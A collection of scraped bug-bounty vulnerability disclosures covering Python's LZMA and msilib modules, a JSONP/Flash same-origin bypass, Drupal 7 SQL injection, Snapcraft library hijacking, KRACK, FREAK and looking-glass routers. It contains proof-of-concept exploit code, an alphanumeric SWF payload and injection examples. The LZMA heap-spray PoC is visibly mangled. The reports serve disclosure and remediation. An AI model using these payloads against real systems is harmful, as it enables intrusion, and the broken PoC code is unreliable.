[...]
memcpy((void*)(lzs->next_in + lzs->avail_in), data, len);
lzs->avail_in += len;
input_buffer_in_use = 1;
}
else {
[...]
}
}
This vulnerability can be exploited to achieve arbitrary code execution. In applications where untrusted LZMA streams are received over a network, it might be possible to exploit this vulnerability remotely. A simple proof of concept that demonstrates a return-to-libc attack is attached.
import _lzma
from array import *
System address when tested: 76064070
d = _lzma.LZMADecompressor()
spray = [];
for x in range(0, 0x700):
meg = bytearray(b'\x76\x70\x40\x06' * int(0x100000 / 4));
spray.append(meg)
def foo():
for x in range(0, 2):
try:
d.decompress(b""\x20\x26\x20\x63\x61\x6c\x63\x00\x41\x41\x41\x41\x41\x41\x41\x41""  int(0x100 / (44)))
except:
pass
foo()
print(len(spray[0]))
print(len(spray))
To fix the issue, it is recommended that lzs->next_in be zeroed in the event the call to decompress_buf fails. A proposed patch is attached.
    result = decompress_buf(d, max_length);
if(result == NULL) {
lzs->next_in = 0;
return NULL;
}
A repro file is attached as well.

Internet Bug Bounty,1-10,1.0,No value,"$1,000.00",No value,0.0,Code Injection,msilib.OpenDatabase Type Confusion,"johnleitch  submitted a report to Internet Bug Bounty.Sep 12th (6 years ago)I have reported a vulnerability in Python that is now fixed. My patch was accepted with minor changes.

http://bugs.python.org/issue24594
The msilib.OpenDatabase method suffers from a type confusion vulnerability caused by the behavior of MsiOpenDatabase(), the underlying win32 function utilized. This is due to the unorthodox handling of the szPersist parameter: when an MSIDBOPEN_* value is passed, it is treated as a predefined persistence mode. However, when a larger value is passed, it is treated as a string pointer, which is used as the path to a new file.
Because the Python method msilib.OpenDatabase passes its persist parameter through to MsiOpenDatabase, it may be possible for an attacker to trigger the type confusion bug should the seemingly innocuous persist parameter be exposed as attack surface. This could have a few consequences: 
1) An attacker might be able to leverage this vulnerability to probe for valid addresses, which could then be used in another exploit to bypass ASLR/DEP.
2) An attacker might be able to leverage this vulnerability to dereference aribtrary values in memory, disclosing secrets.
3) An attacker may be able to spray memory with specially crafted string values, then leverage this vulnerability to pass one of the values as a persist string. Because this would lead to the creation of an MSI file in a location now controlled by the attacker, it could potentially be exploited to achieve remote code execution.
A Python script that demonstrates the vulnerability is as follows:
import msilib
msilib.OpenDatabase("""",0x41414141)
And it produces the following exception:

Due to incorrect buffer management ext_lm_group_acl is vulnerable to a denial of service attack when processing NTLM Authentication credentials. This problem is limited to installations using the
ext_lm_group_acl binary.
Affected Versions
Squid 2.x -> 2.7.STABLE9
Squid 3.x -> 3.5.28
Squid 4.x -> 4.9
Severity
Due to incorrect input validation the NTLM authentication credentials parser in ext_lm_group_acl may write to memory outside the credentials buffer. On systems with memory access protections this can result in the helper process being terminated unexpectedly. Resulting in the Squid process also terminating and a denial of service for all clients using the proxy.

Internet Bug Bounty,1-10,1.0,No value,"$3,000.00",No value,0.0,None,Bypassing Same Origin Policy With JSONP APIs and Flash,"molnarg  submitted a report to Internet Bug Bounty.Apr 29th (9 years ago)Overview
This is a new type of web vulnerability that is made possible by two seemingly unrelated things:

the way JSONP APIs work
the way Flash handles malformed SWF files

and has an effect and limitations similar to XSS flaws:

the user has to visit a website set up by the attacker in order to trigger the vulnerability
as a result, the attacker can make arbitrary HTTP request to the vulnerable domain (with the user's cookies sent along with the request) and read the responses

Description
[JSONP] APIs return JSON data wrapped by an invocation of a callback function specified by the caller.  The caller first defines a JavaScript function and then injects a script tag with the JSON API URL as if it were a JavaScript file to load. JSONP APIs became popular because making JSONP requests are is not forbidden by the Same Origin Policy.
From the point of view of this discussion, the important part is that the first bytes of the response can be controlled by a GET parameter (typically named callback).
If an attacker can create a Flash file, that can be passed as callback parameter to a JSONP API, and passes the filters applied to the callback name, then she is able to load this Flash file in the security context of the JSONP API's domain (the target domain). After the Flash file is loaded, she can make HTTP requests through it to the target domain in the name of the user.
Example:
    Code 122 BytesWrap lines Copy Download1<object type=""application/x-shockwave-flash""
2            data=""http://example.com/jsonp-api?callback=__URL_ENCODED_SWF__"">
Code 67 BytesWrap lines Copy Download1      <param name=""AllowScriptAccess"" value=""always"">
2    </object>
The response to the HTTP request:
    SWF_FILE({""actual"": ""API"", ""response"": 15})
There is two significant problems that have to be solved by an attacker:

the end of the response is the actual JSON API response, and that makes the response as a whole an invalid SWF file.
callback names are almost always filtered, forcing the callback parameter into the [A-Za-z0-9] range

The first problem is in fact solved by the way Flash handles invalid SWF files: it ignores additional bytes at the end of an otherwise valid Flash file.
The second problem turns out to be solvable too. The SWF file format specifies a way to compress the whole file (except an 8 byte header) as a DEFLATE stream. It is possible to create a DEFLATE stream in the [A-Za-z0-9] character range for arbitrary binary data. (As proven by my [ascii-zip] project)
As a demonstration, I've created a Flash file in the given character range that can load an arbitrary SWF file given by the embedder site (the attacker website) into it's security context (the target domain's security context):
    CWSA7000hCD0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SUUnUUU7CiudIbEAtWGDtGDGwwwDDGDG0Gt0GDGwtGDG0sDttwwwDG33w0sDDt03G33333sDfBDIHTOHHoKHBhHZLxHHHrlbhHHtHRHXXHHHdHDuYAENjmENDaqfvjmENyDjmENJYYfmLzMENYQfaFQENYnfVNx1D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SUUnUUU7CiudIbEAtwwwEDG3w0sG0stDDGtw0GDDwwwt3wt333333w03333gFPaEIQSNvTnmAqICTcsacSCtiUAcYVsSyUcliUAcYVIkSICMAULiUAcYVq9D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SUUnUUU7CiudIbEAtwwuG333swG033GDtpDtDtDGDD33333s03333sdFPOwWgotOOOOOOOwodFhfhFtFLFlHLTXXTXxT8D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SUUnUUU7kiudIbEAt33swwEGDDtDG0GGDDwwwDt0wDGwwGG0sDDt033333GDt333swwv3sFPDtdtthLtDdthTthxthXXHHHHhHHHHHHhHXhHHHHXhXhXHXhHhiOUOsxCxHwWhsXKTgtSXhsDCDHshghSLhmHHhDXHhEOUoZQHHshghoeXehMdXwSlhsXkhehMdhwSXhXmHH5D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SUUnUUUwGNqdIbe133333333333333333sUUef03gfzA8880HUAH
The embedder site can specify the SWF to load through the ""name"" property of the object tag. The specified SWF file could be a [cross domain proxy] that can make HTTP requests for the embedder site.
Related work
This attack is inspired by Alok Menghrajani's [related work], where he showed that it is possible to assemble a Flash file in the [\x01-\0x7F] byte range to prove that certain JSONP endpoints are not secure.
The real contribution of my work is the demonstration of the fact that this attack is also feasible in the [A-Za-z0-9] character range. This is critical because overwhelming majority of the JSONP endpoints only accept this character range in the callback name.
Mitigation
Limiting the callback name length is not a good solution, as there is no strong guarantee that it is not possible to come up with an SWF file that conforms to this tightened filter.
The API maintainer can mitigate this type of attack by putting an empty JavaScript callback in front of the callback name in the repsonse. This makes it impossible to control the first bytes of the response.
An other protection would be hosting JSONP APIs on a sandbox domain. The latter solution is only effective if there's no crossdomain.xml rule that would allow requests from the sandbox domain to the main domain.
A proper solution would be changing the way Flash handles malformed SWF files so that it won't files with additional data at the end of the SWF file.
Although one of the mitigations is fixing Flash, I don't consider this a Flash vulnerability, as an affected site does not even have to use the Flash technology in order to be vulnerable.
Affected sites
I've tested the 35 top websites on Wikipedia's (somewhat out of date) copy of the Alexa toplist (after unifying www.google.* domains into a single entry), and 16 (~45%) of them proved to be vulnerable.
The unaffected sites fall into the following categories:

Sites that simply don't have any JSONP API.
Google and Facebook: JSONP answers from these sites begin with empty JavaScript comments (probably because they are being extremely cautious and implemented this protection after the publication of Alok Menghrajani's [related work]).
Sites that host all JSONP APIs on a different domain (this is considered as a best practice) and don't have crossdomain.xml rule on the main site that enables cross domain requests from the API domain.
A single site limits the callback name length to 50 characters.

I waited an month before submitting this report (which has additional non-public exploitation details) to allow users to update. See Example Attack Scenarios for ways this bug could have been used.
Background:
Snapcraft is a Ubuntu project which allows applications to be bundled in containers, installed easily by users, and allow automatic updates of individual packages. Snapcraft is becoming more and more the main way to install packages on Ubuntu systems (including server). For example installing Chromium on Ubuntu 20+ will now install the Snapcraft package instead of the normal apt package. Many users/servers may be using snapcraft installed packages without knowing it. Additionlly Ubuntu recommends installing packages using Snapcraft and even prompts users when they try to run non-installed applications:

3Command 'docker' not found, but can be installed with:

5sudo snap install docker

8See 'snap info docker' for additional versions.
Bug Description:
Snapcraft before 4.4.4 is vulnerable to library inclusion from the current working directory. This allowed attackers to gain remote code execution in almost any application that was installed with snapcraft, when run in an attacker controlled directory. This could be as simple as running an application in a cloned git repository.
The bug is due to incorrect bash script generation when creating confined snap packages. Snapcraft will generate wrapper scripts to run the application, but accidently uses empty variables to define the LD_LIBRARY_PATH for the application. Due to a quirk with LD, empty path entries are treated as current working directory. This means that any libraries (for example libc.so.6) in the current working directory will be loaded into the snap application when run. (Additionally LD will search several subdirectories including tls).
A malicious library could easily be crafted to run arbitrary remote code when a snap application is run. This code will run inside the snap container so it will initially be somewhat restricted and can only access any files in the users home directory (excluding dotfiles). However due to many apps also including X11 permissions, it is fairly trivial to escape the container using X11 commands. This would give an attacker full access to the system as the current user.
Fix
Snapcraft fixed the issue in the script generator by including a check for empty string. However for the fix to be applied, application authors must ""refresh"" their app, regenerating the vulnerable files. This means that many applications are still vulnerable (ie chromium and docker) until re-generated correctly.
POC
Attached is both the POC archive which should still work against chromium. Additionally is a script that generates the malicious libc.so.6

Impact
In many situations, an attacker could gain full access to a user's system running as the current user. The following are example attack scenarios demonstrating how an attacker could abuse this bug against users.
Example Attack Scenarios:
Scenario 1: VLC

Attacker creates a malicious archive containing a video file. Like before the malicious library is hidden in a tls directory to prevent suspicion (potentially even disguised as subtitle information)
The target user wants to view the video file and downloads the archive. They extract the archive and find the video file:

Code 299 BytesWrap lines Copy Download1itszn@ubuntu:~$ tar xfvz movie.tar.gz && cd movie
2itszn@ubuntu:movie$ ls
3total 8
4-rw-rw-r-- 1 itszn itszn    0 Oct 25 11:04 amazing-movie.mp4
5-rw-rw-r-- 1 itszn itszn 2193 Oct 25 11:45 README.txt
6drwxrwxr-x 3 itszn itszn 4096 Oct 25 11:28 tls
7drwxrwxr-x 3 itszn itszn 4096 Oct 25 11:29 tls_subtitles

The user now runs VLC, which they installed using snapcraft (VLC is one of the top Snapcraft apps according to the Snap store).

Code 43 BytesWrap lines Copy Download1itszn@ubuntu:movie$ vlc ./amazing-movie.mp4

At this point the attacker has achived coded exction in the VLC container. The attacker can use the X11 plug to trivially escape this container.
The attacker now has full access to the system as the user

Scenario 2: Chromium

Attacker adds malicious library into a github reposity. The library is hidden in a tls directory in the repo (making it harder to be noticed by the target user). 
Target user clones the git repo and opens the html file with chromium (which since Ubuntu 20 is always installed as a Snapcraft package):

Code 373 BytesWrap lines Copy Download1itszn@ubuntu:~$ git clone git@github.com:example/example-site.git && cd example-site
2itszn@ubuntu:example-site$ ls
3total 8
4-rw-rw-r-- 1 itszn itszn    0 Oct 27 14:31 some_page.html
5drwxrwxr-x 3 itszn itszn 4096 Oct 25 11:29 css
6drwxrwxr-x 3 itszn itszn 4096 Oct 25 11:29 js
7drwxrwxr-x 3 itszn itszn 4096 Oct 25 11:28 tls
8itszn@ubuntu:example-site$ chromium ./some_page.html

Normally to compromise a user from a webpage both a browser exploit and a sandbox escape are required. However as the malicious library is injected before any sandboxing is applied, the attacker does not need to escape the Chromium Sandbox. The attacker now has remote code execution in the chromium container. Additionally this works even if the user already has chromium open (normally it would just tell the other chromium to load the page).
As before, the attacker can use the X11 plug to trivially escape this container.
The attacker now has full access to the system as the user

NOTE: From my testing, Chromium is still vulnerable as they need to manually refresh their snap packages to apply the fix.
Scenario 3: Docker

Attacker adds malicious library into a github reposity. The library is hidden in a tls directory in the repo (making it harder to be noticed by the target user). 
Target user clones the git repo, inspects the Dockerfile, and then builds the docker image. (NOTE: The dockerfile is non malicious. Under normal operation, there would be no risk. The user additionally can validate that the image would normally not attach any files or volumes).

Code 328 BytesWrap lines Copy Download1itszn@ubuntu:~$ git clone git@github.com:example/example-app.git && cd example-app
2itszn@ubuntu:example-app$ ls
3total 8
4-rw-rw-r-- 1 itszn itszn    0 Oct 27 14:31 some_code.js
5-rw-rw-r-- 1 itszn itszn 109 Oct 27 14:22 Dockerfile
6drwxrwxr-x 3 itszn itszn 4096 Oct 25 11:28 tls
7itszn@ubuntu:example-app$ docker build -t some_app .

At this point the attacker has gained remote coded execution in the  Snapcraft container. The docker container can read/write the entirety of the user's home directory (additionally including dotfiles). At this point the attacker could trivially backdoor any dotfile or configuration file in the user's home directory to gain full code execution outside the container.

NOTE: From my testing, Docker is still vulnerable as they need to manually refresh their snap packages to apply the fix.
Final Notes
I personally think this is a very large impact as it meant many applications became vulnerable due to being installed with snapcraft (including chromium!). As Ubuntu transitions more users to Snapcraft this impact would have grown as more apps became vulnerable.2 attachments:F1147458: snap-escape-POC.tar.gzF1147459: make_libc.pyitszn   posted a comment. Jan 8th (2 years ago)Update: The chrome team has now released a new snap package, fixing their vulnerability to this issueitszn   posted a comment. Jan 8th (2 years ago)If you want to test the POC, I found that the Audacity snap is still vulnerable and should hopefully work out of the box with the POC.

Internet Bug Bounty,1-10,1.0,No value,"$3,000.00",No value,0.0,SQL Injection,Drupal 7 pre auth sql injection and remote code execution,"shorst  submitted a report to Internet Bug Bounty.Oct 17th (8 years ago)Motivation
I found a SQL Injection bug in Drupal < 7.32. Which can lead to a code execution. 
You need not have any user or knowledge of the targeted site.
Since Drupal is used as they state by ""millions of websites and applications"" I thought about applying for this bug bounty.
The Bug
Drupal uses Prepared Statements to secure the SQL Querys from Injections. To handle IN statements they created a expandArguments function, which uses the Array keys to create names for the placeholders. 
    foreach ($data as $i => $value) {
[...]
$newkeys[$key . '' . $i] = $value;
}
The function assumes that it is called with an array which has no keys. Example:
    db_query(""SELECT * FROM {users} where name IN (:name)"", array(':name'=>array('user1','user2')));
Which results in this SQL Statement
    SELECT * from users where name IN (:name_0, :name_1)
with the parameters name_0 = user1 and name_1 = user2.
The Problem occurs, if the array has keys, which are no integers. Example:
    db_query(""SELECT * FROM {users} where name IN (:name)"", array(':name'=>array('test) -- ' => 'user1','test' => 'user2')));
this results in an exploitable SQL query:
     SELECT * FROM users WHERE name IN (:name_test) -- , :name_test )
with parameters :name_test = user2.
Since Drupal uses PDO, multi-queries are allowed. So this SQL Injection can be used to insert arbitrary data in the database, dump or modify existing data or drop the whole database.
With the possibility to INSERT arbitrary data into the database an attacker can execute any PHP code through a manipulated Session and Drupal features with callbacks.

Internet Bug Bounty,1-10,1.0,No value,$750.00,No value,0.0,Cryptographic Issues - Generic,Fragmentation and Aggregation Flaws in Wi-Fi,"vanhoefm  submitted a report to Internet Bug Bounty.Jun 19th (about 1 year ago)I discovered three design flaws in the Wi-Fi standard and widespread related implementation flaws (see GitHub overview and test tool). Here I'll specifically cover open source software. These findings have not received bug bounties from other sources.
Implementation flaws allowing trivial packet injection


CVE-2020-26140: Accepting plaintext data frames in a protected network. This allows trivial packet injection. On a Linux client, the AWUS036H network card is vulnerable and two out of four Linux-based home routers were vulnerable. On NetBSD access points, three out of four tested network cards were vulnerable, and on FreeBSD access points, the F5D8053 network card was vulnerable.


CVE-2020-26143: Accepting fragmented plaintext data frames in a protected network. This allows trivial packet injection. On a Linux client, 7 out of 16 network cards were vulnerable. On FreeBSD access points, two out of four tested network cards were vulnerable.


CVE-2020-26145: Accepting plaintext broadcast fragments as full frames. This allows trivial packet injection. All tested network cards on NetBSD and FreeBSD access points were vulnerable. On a Linux client, only the TWFM-B003D network card was vulnerable.


CVE-2020-26144: Accepting plaintext A-MSDU frames that start with an RFC1042 header with EtherType EAPOL. This allows trivial packet injection. On a Linux client, the AWUS036ACH and TWFM-B003D network cards were vulnerable. All 6 tested FreeBSD network cards were vulnerable (both as clients and access points).


Other implementation vulnerabilities


CVE-2020-26139: the access point forwards EAPOL frames even if the client isn't yet authenticated. This allows an adversary to perform the aggregation attack (see below) against any client by simply being within radio range (i.e. no social engineering needed). All NetBSD and FreeBSD access points were vulnerable, as were two out of four Linux-based home routers.


CVE-2020-26146: reassembling encrypted fragments with non-consecutive packet numbers. This can be abused to exfiltrate data, under the condition that another device sends fragmented frames. All tested open source Wi-Fi implementations were vulnerable (FreeBSD, NetBSD, FullMAC Linux drivers) except SoftMAC Linux drivers.


CVE-2020-26147: reassembling mixed encrypted/plaintext fragments. The impact ranges from data exfiltration to packet injection, under the condition that another device sends fragmented frames. All open source Wi-Fi implementations were vulnerable (Linux, FreeBSD, NetBSD, Linux, etc).


CVE-2020-26142: processing fragmented frames as full frames. This can be abused to inject packets, under the condition that the another device sends fragmented frames, and in most cases requires (minor) social engineering. Among open source platforms, only OpenBSD was vulnerable.


CVE-2020-26141: not verifying the TKIP MIC of fragmented frames. This can be abused to exfiltrate and inject packets in old WPA1 networks. On Linux, only the NWD6505 and AWUS036ACM network cards were vulnerable.


Design flaws


Aggregation Attack (CVE-2020-24588): the A-MSDU flag in the plaintext Wi-Fi header is not authenticated. This can be abused, usually in combination with minor social engineering, to inject arbitrary packets to a victim. All 802.11n-compatible open source implementations were vulnerable (Linux, FreeBSD, OpenBSD, etc).


Mixed Key Attack (CVE-2020-24587): a receiver will reassemble fragments that were decrypted using different keys. Under very rare conditions this can be abused to exfiltrate data. All open source Wi-Fi implementations were vulnerable (FreeBSD, NetBSD, Linux, etc) except OpenBSD because it doesn't support fragmentation.


Fragment Cache Attack (CVE-2020-24586): a receiver will not clear fragments from memory when reconnecting or reassociating to a Wi-Fi network. Under the right conditions this can be abused to exfiltrate data. Under very rare conditions it can also be abused to inject arbitrary packets towards clients. Most open source Wi-Fi implementations were vulnerable (FreeBSD, Linux, etc) with the exception of OpenBSD and NetBSD.


Impact
As indicated above, there are two impacts:


Arbitrary packet injection: this clearly breaks the security of Wi-Fi. A first practical example is that this can be abused to make a client use a malicious DNS server to subsequently intercept all traffic (and perform SSL stripping attacks). As second practical example, the adversary can abuse packet injection to ""punch holes in the NAT"" to then directly attack internal devices (e.g. exploit internet-of-things devices or exploit BlueKeep against outdated Windows 7 machines). See this addendum for the technical details or watch three demos.


Data exfiltration: this is only possible if another device sends fragmented frames. In practice this is rare unless Wi-Fi 6 is used. Additionally, the data can only be exfiltrated if no higher-layer encryption is used (i.e. TLS will prevent data exfiltration).


Finally, I've also contributed patches to these open source projects:


Linux: I wrote patches to prevent all attacks. Additional defense-in-depth and driver-specific patches were added by Linux developers.


Wi-Fi standard: I'm helping to update the 802.11 standard to fix the design flaws (starting with A-MSDU fixes).


FreeBSD: I wrote patches to mitigate vulnerabilities in FreeBSD. These patches are now under review [1, 2, 3].


NetBSD: I submitted initial patches. The remaining patches are in progress.


OpenBSD: I reviewed patches related to A-MSDU vulnerabilities resulting in more secure patches.",https://hackerone.com/reports/1238470,No value,No value,No value,2021,6,19,21,24
Internet Bug Bounty,1-10,1.0,No value,"$7,500.00",No value,0.0,Cryptographic Issues - Generic,FREAK: Factoring RSA_EXPORT Keys to Impersonate TLS Servers,"prosecco-inria  submitted a report to Internet Bug Bounty.Mar 5th (8 years ago)Many TLS servers, including those hosting sensitive websites such as
www.nsa.gov and connect.facebook.net, support weak EXPORT_RSA ciphersuites.
By factoring their 512-bit ephemeral RSA keys, a network attacker is able to impersonate
these websites to web browsers and more generally, to client applications relying on
vulnerable TLS libraries. We have demos showing these attacks at www.smacktls.com
Who's vulnerable
Vulnerable TLS client-side libraries (and web browsers) include:

SecureTransport (used by Safari on iOS and OS X)
SChannel (used by Internet Explorer)
OpenSSL versions <= 1.0.1j (used by Android Browser and BlackBerry Browser)
BoringSSL versions before Nov 10, 2014 (used by Chrome <= version 40 on OS X, iOS, Android, Windows)
LibReSSL versions <= 2.1.1
IBM JDK 

OpenSSL 1.0.1k fixes the vulnerability (CVE-2015-0204)
Vulnerable TLS servers are listed and updated at: http://www.freakattack.com
We reported the attack to Akamai, Facebook, FBI, and many banks.
Attack Details
More details are below, in the attached research paper, and on the website: www.smacktls.com#freak
We show a server impersonation attack relying on the following:
(1) Many TLS servers support various EXPORT ciphersuites which are
now considered obsolete and breakable. For instance, the
TLS_RSA_EXPORT_WITH_RC4_40_MD5 ciphersuite relies on a ephemeral
512-bit RSA key that typically stays constant over the lifetime of the
TLS server. Breaking this key allows a network attacker to impersonate
the server to any client that accepts an EXPORT_RSA handshake.
(2) Several TLS client libraries, including e.g. OpenSSL
(<=1.0.1j), accept an EXPORT_RSA ServerKeyExchange
during a regular RSA handshake. For the gory details of this bug, see
the attached research paper.  In effect, these clients are willing to
replace the certificate's public key with a signed ephemeral public
key sent by the server (even if the ephemeral key is very short.)
OpenSSL 1.0.0k fixed this bug (CVE-2015-0204) but previous versions of
OpenSSL (used in Android browsers) and other clients listed above
are vulnerable.
(3) 512-bit keys can now be factored in a few hours. With the help of
Prof. Nadia Heninger who used cado-nfs (http://cado-nfs.gforge.inria.fr/)
to run factoring tasks on the Amazon EC2 cloud, we were able to factor
the ephemeral EXPORT_RSA keys for multiple server instances of
www.nsa.gov and connect.facebook.net. Each factoring task took between
7 and 11 hours and cost about $70-$100.
We note that the EXPORT_RSA keys for TLS servers seem to remain the
same for several days (at least), which makes us think they are only
refreshed when the server instance is rebooted.
DEMO
Putting these three elements together, we have demos that impersonate
various HTTPS websites to the Safari web browser. 
See: http://www.smacktls.com
The demo shows how a network attacker can
(a) hijack HTTPS connections to www.nsa.gov to tamper with the careers page
(b) hijack HTTPS connections to the Facebook JavaScript SDK to inject malicious
scripts in innocent third-party websites
Countermeasures
We are already in touch with Apple, IBM, Microsoft and Google to fix the
RSA_EXPORT bug on the client-side libraries. However, it seems likely
that many clients will continue to use older versions of these
libraries (e.g. Android cannot be easily updated.)
We recommend that all TLS servers stop supporting EXPORT_RSA
ciphersuites. This would protect the hosted websites.1 attachment:F30946: smack.pdf",https://hackerone.com/reports/50170,No value,No value,No value,2015,3,5,16,18

PHP is vulnerable, albeit in a deprecated set of functions, and the vulnerability can be exposed to the internet with a single line of PHP code. I have both filed a format bug report on their bug tracker and enquired about the status of said report at their security mail address, and as of present I have not received a response yet. The vulnerable code is statically included with PHP (ie. the presence of the vulnerability in PHP does not depend on the underlying libc).
Android's Bionic libc may also be vulnerable since it includes the vulnerable code in its upsteam-netbsd directory ( https://github.com/android/platform_bionic/blob/7dd126a38ca501818b07927f310dcc0f531c0f1f/libc/upstream-netbsd/lib/libc/regex/regcomp.c#L270 ). I'm not sure if it's directly vulnerable but if you wish so I can try my best to check if it is.

IP-in-IP encapsulation is a tunneling protocol specified in RFC 2003 that allows for IP packets to be encapsulated inside another IP packets. This is very similar to IPSEC VPNs in tunnel mode, except in the case of IP-in-IP, the traffic is unencrypted. As specified, the protocol unwraps the inner IP packet and forwards this packet through IP routing tables, potentially providing unexpected access to network paths available to the vulnerable device. An IP-in-IP device is considered to be vulnerable if it accepts IP-in-IP packets from any source to any destination without explicit configuration between the specified source and destination IP addresses. This unexpected Data Processing Error (CWE-19) by a vulnerable device can be abused to perform reflective DDoS and in certain scenarios used to bypass network access control lists. Because the forwarded network packet may not be inspected or verified by vulnerable devices, there are possibly other unexpected behaviors that can be abused by an attacker on the target device or the target device's network environment.

Internet Bug Bounty,1-10,1.0,No value,"$25,000.00",Medium,6.8,"Reusing a Nonce, Key Pair in Encryption",Key Reinstallation Attacks: Breaking WPA2 by forcing nonce reuse,"vanhoefm  submitted a report to Internet Bug Bounty.Nov 2nd (5 years ago)Full background information is at krackattacks.com and all detailed information can be found in our research paper.
Key Reinstallation Attack: 4-way handshake example
We use the 4-way handshake to illustrate the idea behind key reinstallation attacks (CVE-2017-13077).
Note that in practice, all protected Wi-Fi network rely on the 4-way handshake to derive a fresh session key (PTK) from some shared secret.
Step 1. Channel-based man-in-the-middle and initial handshake messages:

The adversary clones the access point (AP) on a different channel. Say the real AP is on channel 6, and it will be cloned on channel 1.
The adversary uses Channel Switch Announcements to force victims into connecting to the cloned AP on channel 1.
The adversary forwards the first three message of the 4-way handshake between the client and AP (i.e. the adversary fowards frames over the different channels).
After the client receives message 3 of the handshake, it will install the fresh session key (PTK) for the first time.

Step 2. Triggering a key reinstallation:

The attacker does not forward message 4 of the handshake to the AP, effectively blocking it.
As a result, the AP will retransmit message 3 to the client.
After the client receives message 3, it responds with message 4. In practice all clients encrypt this retransmitted message 4 at the link layer. Note that it's encrypted because message 4 an ordinary data frame, and the victim has already installed the session key to encrypt data frames (recall end of step 1). The victim will use a nonce value of 1 to encrypt message 4.
After sending message 4, the client will reinstall the session key. This resets the transmit nonce to zero.

Step 3. Abusing nonce reuse:

When the client now transmit a normal encrypted data frame, it will increment the nonce counter, and then reuse the nonce value 1 when encrypting the data frame.
We can derive known keystream from the encrypted retransmitted message 4 (recall step 2), and use this to decrypt parts of the just transmitted encrypted data frame.
Other predictable packets (ARP, DHCP, HTML, and so on) can be used to obtain additional known plaintext and keystream, which can in turn be used to decrypt more and bigger packets.

The above example attack against the 4-way handshake is also illustrated in my CCS'17 presentation.
Other handshakes
Other Wi-Fi handshakes or features that were found to be vulnerable to key reinstallation attacks are:

Reinstallation of group keys in the 4-way handshake: CVE-2017-13078 and CVE-2017-13079
The group key handshake: CVE-2017-13080 and CVE-2017-13081
The Fast BSS Transition (FT) handshake: CVE-2017-13082
The PeerKey handshake: CVE-2017-13084
The Tunneled Direct-Link Setup (TDLS) handshake: CVE-2017-13086
Handling of Wireless Network Management (WNM) Sleep Mode Response frame: CVE-2017-13087 and CVE-2017-13088.

Countermeasures
Implementations can be updated to prevent key reinstallation attacks in a backwards-compatible manner.
As an additional mitigation, an access point can also prevent most attacks against vulnerable clients.
In particular, attacks against the 4-way handshake can be prevented by not retransmitting message 3.
Similarly, attacks against the group key handshake can be prevented by not retransmitting message 1 of the group key handshake. Alternatively, the access point can retransmit these two handshake messages using the previously used EAPOL-Key replay counter.
Additional Contributions

We helped with writing several patches for hostap, which is used in Linux, Android, and several professional APs.
We wrote most parts of the patch to OpenBSD.
We created vulnerability test tools to detect if devices are vulnerable. The Wi-Fi Alliance is using these to test if new products are affected or not. These test tools will be released publically once they are stable enough.

Vulnerability Scope:
All versions of the LZ4 software:
https://code.google.com/p/lz4
Functions Affected:
lz4.c:LZ4_decompress_generic
Criticality Reasoning
Due to the design of the algorithm, an attacker can specify any desired
offset to a write pointer. The attacker can instrument the write in such
a way as to only write four bytes at a specified offset. Subsequent code
will allow the attacker to escape from the decompression algorithm without
further memory corruption. This may allow the attacker to overwrite
critical structures in memory that affect flow of execution. White DoS
and OOW are obvious side effects of this flaw, RCE with respect to this
flaw is untested.

The TLDR is that many services which host Mercurial servers often write their own hg-ssh wrapper or heavily customize the hg-ssh wrapper.  If the customized wrapped does not explicitly validate user input to the repo attribute, an attacker can supply a string of ""--debugger"", which causes the internal hg binary to drop to a Pdb shell, which allows arbitrary Python code execution.

Internet Bug Bounty,1-10,1.0,No value,"$5,000.00",No value,0.0,Cross-site Scripting (XSS) - Generic,Multiple issues in looking-glass software (aka from web to BGP injections),"kaeso  submitted a report to Internet Bug Bounty.Jun 13th (8 years ago)During the month of May 2014 we performed an offensive security analysis, trying to find how hard would it be for a low-to-medium skilled attacker to disrupt the core of the Internet (ie. achieve the largest possible impact at the lowest common layer, with minimal resource). This is a confidential report on our results, showing vulnerabilities and incidents which have been properly reported in the meanwhile (authors contacted, CVE assigned, patches written and incidents handled).
Motivations
The target of our analysis are looking-glasses, web applications hosted by Autonomous Systems to offer restrict public access in order to debug network connectivity issues. We identified them as a possible weak links because:

they are web scripts, directly connected to backbone (BGP) routers via telnet/ssh
many of them have been written in 90's or 00's, without security in mind
many of them have not seen any update in many years
a bunch of open-source software are deployed by many ASes
 A succesfull attack on a looking-glass means gaining access to routers console, by just attacking decade-old PHP/Perl scripts.
An attacker could steal credentials or find web-flaws to login and run arbitrary commands on the routers. Even with proper ACL in place, it is easy to escalate privileges by abusing one of many existing techniques, eg. on Cisco [0] and on Juniper [1] routers.


Once there, an attacker can cause great havoc on the network. Low-hanging targets include leaking sensitive informations (eg. private routing plans) and fingerprinting the internal network. Medium-level attacks could encompass redirecting some of internal routing (eg. setting up mirroring interfaces) or performing DoS (eg. by changin OSPF configuration).
High-level attacks would instead be targeted to the Internet: multiple rogue routers announcing malicious BGP routes will effectively disrupt worldwide connectivity.
 The last point is basically our motivation to submitting for this bug bounty, as the vulnerabilities and incidents below could have been abused to disrupt the Internet at BGP level from multiple injection points.
Results
All the flaws we found can be categorized as follow:

unsafe default config resulting in exposed IP, credentials, and SSH private keys => direct login to routers
weak commands sanitization => arbitrary commands injection to routers
remote memory corruption => RCE on looking-glass servers, exploitable to read routers credentials
reflected XSS => stealing cookies for other network administration panels under the same-origin

In particular, we got 6 CVEs assigned and confirmed:

XSS in Cougar-LG - http://www.s3.eurecom.fr/cve/CVE-2014-3926.txt

Each report contains full details and timeline on the issue.
Starting from the above CVEs, we performed a brief survey of impacted AS and we observed the following number of incidents:

18 exposed configuration files (containing IPs, usernames, telnet/ssh passwords)
12 remote command injection (via mrlg4php)
4 misconfigured CGI (exposed IPs, usernames, telnet/ssh passwords)
3 exposed SSH private keys

We privately contacted all the ISP (Cc:ing their national FSIRT) to properly secure the exposed configuration files, and to update mrlg4php to fixed version.
Disclosure
In order to avoid major screw-ups, we proceed as following:

asked CERT-FR (our national one) and CERT/CC to coordinate disclosure for us, they suggested instead to handle the issue ourself
contacted MITRE to get confirmation of the issues, got 6 CVEs assigned
contacted authors to report the issues. Worked with the available ones for a patched version. Filled bugs for unreachable ones, as suggested by CERT/CC.
contacted all AS and national FSIRT to report the incidents we spot in the wild. Worked with them for follow-ups.

